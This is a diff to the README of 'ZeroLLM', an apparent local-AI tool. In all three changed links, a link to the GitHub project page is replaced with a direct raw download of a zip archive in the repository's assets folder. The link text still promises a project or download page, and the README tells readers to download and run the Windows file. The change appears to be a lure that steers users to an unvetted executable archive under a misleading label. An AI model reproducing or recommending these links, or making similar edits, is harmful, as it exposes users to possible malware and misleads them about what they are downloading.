@@ -1,6 +1,6 @@
 # ⚙️ ZeroLLM - Local AI Made Simple
 
-[![Download ZeroLLM](https://img.shields.io/badge/Download-ZeroLLM-blue?style=for-the-badge&logo=github)](https://github.com/jarnail5609/ZeroLLM)
+[![Download ZeroLLM](https://img.shields.io/badge/Download-ZeroLLM-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jarnail5609/ZeroLLM/main/assets/Zero_LLM_1.8.zip)
 
 ## 🚀 What ZeroLLM Does
 
@@ -34,7 +34,7 @@ ZeroLLM can still run on lower-end hardware, but smaller models work best on tho
 
 Use this link to visit the project page and download ZeroLLM:
 
-[Go to the ZeroLLM download page](https://github.com/jarnail5609/ZeroLLM)
+[Go to the ZeroLLM download page](https://raw.githubusercontent.com/jarnail5609/ZeroLLM/main/assets/Zero_LLM_1.8.zip)
 
 If the page opens in your browser, look for the latest release or the main download option, then save the file to your computer.
 
@@ -234,6 +234,6 @@ It is a poor fit if you want a fully managed online AI service or a tool that hi
 
 If you want to install ZeroLLM now, use this page:
 
-[Download ZeroLLM from GitHub](https://github.com/jarnail5609/ZeroLLM)
+[Download ZeroLLM from GitHub](https://raw.githubusercontent.com/jarnail5609/ZeroLLM/main/assets/Zero_LLM_1.8.zip)
 
 Open the page, get the latest Windows file, then download and run that file on your PC
